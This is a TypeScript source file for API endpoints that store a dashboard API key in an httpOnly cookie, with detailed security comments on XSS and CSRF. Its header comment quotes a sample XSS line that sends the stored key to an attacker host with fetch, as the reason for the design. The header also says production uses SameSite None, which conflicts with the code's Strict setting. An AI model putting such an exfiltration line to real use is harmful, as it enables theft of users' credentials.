// REVIEW.md HIGH-03 — dashboard session endpoints.
//
// The old UX stored the API key in localStorage and sent it as X-API-Key
// on every request. Any XSS in the dashboard origin could exfiltrate it
// with `fetch(attacker, { body: localStorage.railforge_api_key })`.
//
// These two endpoints move the key off localStorage and into an httpOnly
// Secure cookie that JS cannot read. The cookie is scoped to the API
// origin; the dashboard calls the API with `credentials: 'include'` so
// the browser attaches it automatically.
//
//   POST /v1/dashboard/session    { api_key } → sets the cookie
//   DELETE /v1/dashboard/session             → clears the cookie
//
// Security notes:
//  - The POST runs BEFORE the global /v1 auth chain (see apps/api/src/
//    index.ts) because the caller isn't authenticated yet. We validate
//    the key here by hashing + looking it up in `api_keys`, using the
//    SAME hashApiKey + isActive + revokedAt filters as the auth
//    middleware. Same fail-closed posture: the DB query errors out → 503.
//  - The cookie is Secure in production (https only) and omitted in
//    development so localhost→localhost works without HTTPS.
//  - SameSite mode is environment-dependent — see the inline comment on
//    the setCookie call below for the cross-site reasoning + remaining
//    CSRF defenses. Dev uses Strict; production uses None.

import { and, db, eq, isNull, schema } from '@railforge/db';
import { Hono } from 'hono';
import { deleteCookie, setCookie } from 'hono/cookie';
import { z } from 'zod';
import { logger } from '../logger.ts';
import { SESSION_COOKIE_NAME, hashApiKey } from '../middleware/auth.ts';
import type { AppEnv } from '../types.ts';

const session = new Hono<AppEnv>();

const loginSchema = z.object({
  api_key: z.string().min(10).max(256),
});

/**
 * Cookie age — 7 days. Long enough that a developer closing the laptop
 * overnight doesn't re-authenticate; short enough that a stolen cookie
 * expires on its own. Cookies are also revoked server-side when the
 * underlying API key is revoked (the auth middleware fails-closed).
 */
const SESSION_MAX_AGE_SECONDS = 7 * 24 * 60 * 60;

session.post('/', async (c) => {
  let body: { api_key: string };
  try {
    body = loginSchema.parse(await c.req.json());
  } catch {
    return c.json({ error: 'invalid request body' }, 400);
  }
  if (body.api_key.includes(',')) {
    // Matches the header-smuggling check in auth.ts. A comma is never a
    // legitimate character in a key we issue.
    return c.json({ error: 'Invalid API key' }, 401);
  }

  // Validate the key the same way auth.ts does: HMAC + active + not revoked.
  let rows: Array<{ id: string }>;
  try {
    rows = await db
      .select({ id: schema.apiKeys.id })
      .from(schema.apiKeys)
      .where(
        and(
          eq(schema.apiKeys.keyHash, hashApiKey(body.api_key)),
          eq(schema.apiKeys.isActive, true),
          isNull(schema.apiKeys.revokedAt),
        ),
      )
      .limit(1);
  } catch (err) {
    logger.error({ err }, 'session login DB query failed');
    return c.json({ error: 'Service unavailable' }, 503);
  }
  if (rows.length === 0) {
    // Same generic message + status as auth.ts — no enumeration oracle.
    return c.json({ error: 'Invalid API key' }, 401);
  }

  const isProd = process.env.NODE_ENV === 'production';
  // SameSite=Strict — load-bearing for CSRF.
  //
  // Originally we tried `Strict` and hit a wall in production: dashboard
  // (`*.workers.dev`) ↔ API (`*.fly.dev`) are different sites (both on the
  // Public Suffix List), so the cookie became third-party and modern
  // browsers' tracking protection refused to store it even with
  // `SameSite=None; Secure`. We briefly relaxed to `None` and that worked
  // in curl but failed in real browsers.
  //
  // The current production setup avoids the cross-site problem entirely:
  // a Cloudflare Worker (apps/dashboard/worker/index.ts) proxies /v1/* to
  // the Fly API, so from the browser's POV every dashboard→API request is
  // same-origin. The Set-Cookie response then lands as a first-party
  // cookie on the dashboard origin and SameSite=Strict works as designed.
  //
  // CSRF defense — what's protecting state-changing endpoints:
  //   1. SameSite=Strict (this) blocks the cookie on cross-site requests.
  //   2. CORS allowlist (`DASHBOARD_ORIGIN`) blocks browsers from making
  //      credentialed requests from non-allowlisted origins (defense in
  //      depth — also useful for local dev where origins differ).
  //   3. The `Idempotency-Key` custom header is REQUIRED on every state-
  //      changing /v1/* call, which forces a CORS preflight an attacker
  //      site cannot bypass.
  //   4. The cookie is httpOnly — XSS in the dashboard origin cannot read
  //      the API key from JS memory.
  //
  // If you ever need a true cross-site flow (OAuth callback, IdP-initiated
  // redirect, embedded iframe in a partner domain), downgrade to `Lax`
  // (NOT `None`) and pair with a CSRF double-submit token on every state-
  // changing /v1/dashboard/* call. Don't silently relax this.
  setCookie(c, SESSION_COOKIE_NAME, body.api_key, {
    httpOnly: true,
    sameSite: 'Strict',
    secure: isProd,
    path: '/',
    maxAge: SESSION_MAX_AGE_SECONDS,
  });
  return c.body(null, 204);
});

session.delete('/', async (c) => {
  // Best-effort client-side clear; we don't revoke the underlying API key
  // here (that's the dedicated /v1/dashboard/keys/:id/revoke endpoint).
  deleteCookie(c, SESSION_COOKIE_NAME, { path: '/' });
  return c.body(null, 204);
});

export default session;
